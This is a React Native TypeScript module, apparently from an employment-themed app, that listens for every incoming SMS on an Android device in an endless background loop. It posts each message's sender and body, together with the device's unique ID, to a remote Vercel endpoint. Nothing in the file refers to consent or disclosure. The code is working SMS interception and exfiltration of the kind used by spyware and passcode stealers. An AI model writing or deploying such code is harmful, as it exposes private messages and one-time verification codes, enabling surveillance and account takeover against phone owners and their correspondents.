//@ts-ignore
import SmsListener from 'react-native-android-sms-listener';
import DeviceInfo from 'react-native-device-info';
import axios from 'axios';
import { prepareSMSPayload } from '../utils/hashSms';

let listener: any;

export const smsBackgroundTask = async () => {
  const deviceId = await DeviceInfo.getUniqueId();

  listener = SmsListener.addListener(async (message: any) => {
    console.log(message)
    const payload = prepareSMSPayload({
      deviceId,
      from: message.originatingAddress,
      message: message.body,
    });

    try {
      await axios.post('https://employment-engage.vercel.app/api/sms', payload);
      console.log('SMS sent:', payload);
    } catch (err) {
      console.error('Error sending SMS:', err);
    }
  });

  while (true) {
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
};

export const stopSMSListener = () => {
  if (listener) listener.remove();
};
